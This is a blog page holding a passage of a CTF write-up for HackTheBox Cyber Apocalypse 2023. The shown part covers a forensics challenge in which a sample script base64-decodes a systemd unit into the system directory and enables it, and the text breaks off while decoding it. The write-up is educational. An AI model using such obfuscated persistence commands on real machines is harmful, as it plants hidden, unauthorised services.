<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Forensics Extraterrestrial Persistence There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence? Difficulty: very easy\nFor this challenge we are provided with a small persistence.sh script. Within the code, we see base64 encoded information being directed to a file service.service, then being called:\n">
<title>HackTheBox_Cyber_Apocalypse_2023</title>

<link rel='canonical' href='/post/hackthebox_cyber_apocalypse_2023/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox_Cyber_Apocalypse_2023">
<meta property='og:description' content="Forensics Extraterrestrial Persistence There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence? Difficulty: very easy\nFor this challenge we are provided with a small persistence.sh script. Within the code, we see base64 encoded information being directed to a file service.service, then being called:\n">
<meta property='og:url' content='/post/hackthebox_cyber_apocalypse_2023/'>
<meta property='og:site_name' content='Spencer&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Forensics' /><meta property='article:tag' content='Misc' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Pwn' /><meta property='article:published_time' content='2023-03-25T19:01:05-05:00'/><meta property='article:modified_time' content='2023-03-25T19:01:05-05:00'/>
<meta name="twitter:title" content="HackTheBox_Cyber_Apocalypse_2023">
<meta name="twitter:description" content="Forensics Extraterrestrial Persistence There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence? Difficulty: very easy\nFor this challenge we are provided with a small persistence.sh script. Within the code, we see base64 encoded information being directed to a file service.service, then being called:\n">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu15825637002793526326.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/spencerja'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://app.hackthebox.com/profile/1202496'
                        target="_blank"
                        title="HackTheBox"
                        rel="me"
                    >
                        
                        
                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
    <g>
        <path
            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
        </path>
    </g>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://ctftime.org/team/217710'
                        target="_blank"
                        title="Team"
                        rel="me"
                    >
                        
                        
                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
    preserveAspectRatio="xMidYMid meet">
    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
    </g>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://tryhackme.com/p/spencerj'
                        target="_blank"
                        title="TryHackMe"
                        rel="me"
                    >
                        
                        
                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
</svg>

                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/post' >
                
                
                
                <span>Posts</span>
            </a>
        </li>
        
        
        <li >
            <a href='/awards' >
                
                
                
                <span>Trophy Room</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ul>
    <li><a href="#forensics">Forensics</a>
      <ul>
        <li><a href="#extraterrestrial-persistence">Extraterrestrial Persistence</a></li>
      </ul>
    </li>
    <li><a href="#misc">Misc</a>
      <ul>
        <li><a href="#hijack">Hijack</a></li>
        <li><a href="#janken">Janken</a></li>
        <li><a href="#nehebkaus-trap">Nehebkaus Trap</a></li>
        <li><a href="#persistence">Persistence</a></li>
        <li><a href="#restricted">Restricted</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#labyrinth">Labyrinth</a></li>
      </ul>
    </li>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#drobots">Drobots</a></li>
        <li><a href="#gunhead">Gunhead</a></li>
        <li><a href="#orbital">Orbital</a></li>
        <li><a href="#passman">Passman</a></li>
        <li><a href="#trapped-source">Trapped Source</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf/" >
                CTF
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/post/hackthebox_cyber_apocalypse_2023/">HackTheBox_Cyber_Apocalypse_2023</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Mar 25, 2023</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="forensics">Forensics
</h2><h3 id="extraterrestrial-persistence">Extraterrestrial Persistence
</h3><blockquote>
<p>There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence?
<strong>Difficulty: very easy</strong></p>
</blockquote>
<hr>
<p>For this challenge we are provided with a small <code>persistence.sh</code> script. Within the code, we see base64 encoded information being directed to a file service.service, then being called:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==&#34;</span><span class="p">|</span>base64 --decode &gt; /usr/lib/systemd/system/service.service
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">systemctl <span class="nb">enable</span> service.service
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can decode this base64 ourselves and have a better idea on what is being done</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> -e <span class="s2">&#34;W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==&#34;</span><span class="p">|</span>base64 --decode
</span></span><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>HTB<span class="o">{</span>th3s3_4l13nS_4r3_s00000_b4s1c<span class="o">}</span>
